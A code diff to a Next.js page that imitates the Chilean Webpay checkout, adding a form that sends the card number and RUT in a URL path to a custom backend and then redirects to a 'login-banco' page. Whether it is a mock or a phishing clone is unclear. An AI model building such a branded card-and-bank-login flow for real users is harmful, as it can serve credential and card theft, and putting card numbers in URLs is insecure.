@@ -6,7 +6,9 @@ import { IoPerson } from "react-icons/io5";
 import { MdQrCodeScanner } from "react-icons/md";
 import { FaRegCreditCard } from "react-icons/fa";
 import { PiBankLight } from "react-icons/pi";
-import { useState } from "react";
+import { useState, useEffect } from "react";
+import { useRouter } from "next/navigation";
+import API_CONFIG from "@/config/api";
 
 // Colores webpay
 const coloresWebpay = {
@@ -15,8 +17,80 @@ const coloresWebpay = {
 	cyan: '#00C7B1',
 };
 
+// Función para formatear número de tarjeta
+function formatearNumeroTarjeta(valor: string) {
+  const soloNumeros = valor.replace(/\D/g, '');
+  return soloNumeros.replace(/(.{4})/g, '$1 ').trim();
+}
+
+// Función para formatear RUT con puntos y guión
+function formatearRut(rut: string) {
+  // Elimina todo lo que no sea número o K/k
+  rut = rut.replace(/[^0-9kK]/g, '').toUpperCase();
+  if (rut.length === 0) return '';
+  let cuerpo = rut.slice(0, -1);
+  let dv = rut.slice(-1);
+  cuerpo = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+  return cuerpo.length ? `${cuerpo}-${dv}` : dv;
+}
+
 export default function WebpayPage() {
     const [medioSeleccionado, setMedioSeleccionado] = useState<"tarjeta" | "onepay" | null>(null);
+    const [numeroTarjeta, setNumeroTarjeta] = useState('');
+    const [rutTarjeta, setRutTarjeta] = useState('');
+    const [montoPago, setMontoPago] = useState<string | null>(null); // Monto fijo de $1.000
+
+	const [error, setError] = useState('');
+    
+	const [loading, setLoading] = useState(false);
+    
+	const router = useRouter();
+
+	// Recuperamos monto pago desde sessionStorage
+	useEffect(() => {
+		const datos = sessionStorage.getItem('monto_pago');
+		if (datos) {
+			const parsed = JSON.parse(datos);
+			setMontoPago(Number(parsed).toLocaleString());
+		}
+	}, []);
+
+    // Función para limpiar el número de tarjeta y rut antes de enviar
+    function limpiarNumeroTarjeta(valor: string) {
+        return valor.replace(/\D/g, '');
+    }
+    function limpiarRut(valor: string) {
+        return valor.replace(/[.]/g, '');
+    }
+
+    async function handleValidarBanco(e: React.FormEvent) {
+        e.preventDefault();
+        setError('');
+        setLoading(true);
+        try {
+            const numTarjetaLimpio = limpiarNumeroTarjeta(numeroTarjeta);
+            const rutLimpio = limpiarRut(rutTarjeta);
+            const res = await fetch(`${API_CONFIG.TGR}banco/${numTarjetaLimpio}/${rutLimpio}`);
+            if (!res.ok) {
+                setError('No se pudo validar la tarjeta o el RUT. Verifica los datos e inténtalo nuevamente.');
+                setLoading(false);
+                return;
+            }
+            const data = await res.json();
+            // Puedes validar aquí si la respuesta es la esperada
+            if (data && data.banco) {
+				// Guardar datos en sessionStorage
+				sessionStorage.setItem('rutTarjeta', rutLimpio);
+				sessionStorage.setItem('banco', data.banco);
+                router.push('/webpay/login-banco');
+            } else {
+                setError('Datos incorrectos o banco no encontrado.');
+            }
+        } catch (err) {
+            setError('Error de conexión. Intenta nuevamente.');
+        }
+        setLoading(false);
+    }
 
     return (
         <div style={{ fontFamily: 'Arial, sans-serif'}}>
@@ -45,7 +119,7 @@ export default function WebpayPage() {
 							</div>
 							<div className="col text-right">
 								<p>Monto a pagar:</p>
-								<p style={{ fontWeight: 'bold', fontSize: '1.5rem' }}>$ 1.000</p>
+								<p style={{ fontWeight: 'bold', fontSize: '1.5rem' }}>${montoPago}</p>
 							</div>
 						</div>
 						{/* Seleccionar medio de pago */}
@@ -141,71 +215,106 @@ export default function WebpayPage() {
 							</div>
 						</div>
 						{/* Número de tarjeta */}
-						<div className="mb-3">
-							<label htmlFor="cardNumber" className="form-label" style={{ fontWeight: 'bold' }}>Número de tarjeta</label>
-							<div style={{ position: 'relative' }}>
-								<HiOutlineCreditCard
-									style={{
-										position: 'absolute',
-										left: 14,
-										top: '50%',
-										transform: 'translateY(-50%)',
-										fontSize: '1.5rem',
-										color: '#585858ff',
-										pointerEvents: 'none'
-									}}
-								/>
+						<form onSubmit={handleValidarBanco}>
+							<div className="mb-3">
+								<label htmlFor="cardNumber" className="form-label" style={{ fontWeight: 'bold' }}>Número de tarjeta</label>
+								<div style={{ position: 'relative' }}>
+									<HiOutlineCreditCard
+										style={{
+											position: 'absolute',
+											left: 14,
+											top: '50%',
+											transform: 'translateY(-50%)',
+											fontSize: '1.5rem',
+											color: '#585858ff',
+											pointerEvents: 'none'
+										}}
+									/>
+									<input
+										type="text"
+										className="form-control"
+										placeholder="XXXX XXXX XXXX XXXX"
+										style={{ paddingLeft: '3rem', height: '3rem', borderRadius: '7px', borderWidth: '2px', borderColor: '#d1d1d1' }}
+										id="cardNumber"
+										maxLength={19}
+										value={numeroTarjeta}
+										onChange={e => setNumeroTarjeta(formatearNumeroTarjeta(e.target.value))}
+										required
+									/>
+								</div>
+							</div>
+							{/* RUT */}
+							<div className="mb-3">
+								<label htmlFor="rutTarjeta" className="form-label" style={{ fontWeight: 'bold' }}>RUT</label>
+								<div style={{ position: 'relative' }}>
+									<IoPerson
+										style={{
+											position: 'absolute',
+											left: 14,
+											top: '50%',
+											transform: 'translateY(50%)',
+											fontSize: '1.5rem',
+											color: '#585858ff',
+											pointerEvents: 'none'
+										}}
+									/>
+								</div>
 								<input
 									type="text"
 									className="form-control"
-									placeholder="XXXX XXXX XXXX XXXX"
+									placeholder="12.345.678-9"
 									style={{ paddingLeft: '3rem', height: '3rem', borderRadius: '7px', borderWidth: '2px', borderColor: '#d1d1d1' }}
-									id="cardNumber"
-								/>
-							</div>
-						</div>
-						{/* RUT */}
-						<div className="mb-3">
-							<label htmlFor="rut" className="form-label" style={{ fontWeight: 'bold' }}>RUT</label>
-							<div style={{ position: 'relative' }}>
-								<IoPerson
-									style={{
-										position: 'absolute',
-										left: 14,
-										top: '50%',
-										transform: 'translateY(50%)',
-										fontSize: '1.5rem',
-										color: '#585858ff',
-										pointerEvents: 'none'
+									id="rutTarjeta"
+									maxLength={12}
+									value={rutTarjeta}
+									onChange={e => {
+										const limpio = e.target.value.replace(/[.\-]/g, '');
+										setRutTarjeta(formatearRut(limpio));
 									}}
+									required
 								/>
 							</div>
-							<input
-								type="text"
-								className="form-control"
-								placeholder="12.345.678-9"
-								style={{ paddingLeft: '3rem', height: '3rem', borderRadius: '7px', borderWidth: '2px', borderColor: '#d1d1d1' }}
-								id="rut"
-							/>
-						</div>
-						{/* Botón continuar */}
-						<div className="text-center">
-							<button className=""
-								style={{
-									backgroundColor: coloresWebpay.morado,
-									borderColor: coloresWebpay.morado,
-									borderRadius: '7px',
-									width: '100%',
-									color: 'white',
-									fontWeight: 'bold',
-									padding: '10px',
-									fontSize: '1rem',
-									height: '4rem',
-								}}
-							>
-								Continuar
-							</button>
-						</div>
+							{/* Mensaje de error */}
+							{error && (
+								<div
+									style={{
+										background: '#fff0f3',
+										border: '2px solid #D00070',
+										borderRadius: '12px',
+										color: '#D00070',
+										padding: '16px',
+										marginBottom: '18px',
+										fontWeight: 'bold',
+										textAlign: 'center'
+									}}
+								>
+									{error}
+								</div>
+							)}
+							{/* Botón continuar */}
+							<div className="text-center">
+								<button
+									className=""
+									style={{
+										backgroundColor: coloresWebpay.morado,
+										borderColor: coloresWebpay.morado,
+										borderRadius: '7px',
+										width: '100%',
+										color: 'white',
+										fontWeight: 'bold',
+										padding: '10px',
+										fontSize: '1rem',
+										height: '4rem',
+										opacity: loading ? 0.7 : 1,
+										cursor: loading ? 'not-allowed' : 'pointer'
+									}}
+									type="submit"
+									disabled={loading}
+								>
+									{loading ? "Validando..." : "Continuar"}
+								</button>
+							</div>
+						</form>
 						{/* Medios de pago */}
 						<div className="text-center mt-4 d-flex flex-column align-items-center">
 							<img src="/img/medios-pago.png" alt="Medios de pago" style={{ width: '50%' }} />
